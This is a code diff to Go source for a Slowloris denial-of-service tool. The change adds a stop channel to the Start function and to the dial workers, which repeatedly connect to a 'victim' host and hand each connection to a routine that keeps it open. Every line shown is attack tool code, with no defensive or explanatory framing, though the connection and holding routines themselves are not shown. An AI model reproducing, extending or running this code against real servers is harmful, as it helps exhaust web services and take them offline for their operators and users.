@@ -30,7 +30,7 @@ var (
 	sharedWriteBuf = []byte("A")
 )
 
-func Start(config *Config) error {
+func Start(stopChan chan bool, config *Config) error {
 	s := &SlowLoris{
 		Config: config,
 	}
@@ -60,7 +60,7 @@ func Start(config *Config) error {
 	activeConnectionsCh := make(chan int, config.DialWorkersCount)
 	go s.activeConnectionsCounter(activeConnectionsCh)
 	for i := 0; i < config.DialWorkersCount; i++ {
-		go s.dialWorker(config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
+		go s.dialWorker(stopChan, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
 	}
 	time.Sleep(config.DurationSeconds)
@@ -68,14 +68,18 @@ func Start(config *Config) error {
 	return nil
 }
 
-func (s SlowLoris) dialWorker(config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetUri *url.URL, requestHeader []byte) {
+func (s SlowLoris) dialWorker(stopChan chan bool, config *Config, activeConnectionsCh chan<- int, targetHostPort string, targetUri *url.URL, requestHeader []byte) {
 	isTls := targetUri.Scheme == "https"
-
 	for {
-		time.Sleep(config.RampUpInterval)
-		conn := s.dialVictim(targetHostPort, isTls)
-		if conn != nil {
-			go s.doLoris(config, conn, activeConnectionsCh, requestHeader)
+		select {
+		case <-stopChan:
+			return
+		default:
+			time.Sleep(config.RampUpInterval)
+			conn := s.dialVictim(targetHostPort, isTls)
+			if conn != nil {
+				go s.doLoris(config, conn, activeConnectionsCh, requestHeader)
+			}
 		}
 	}
 }
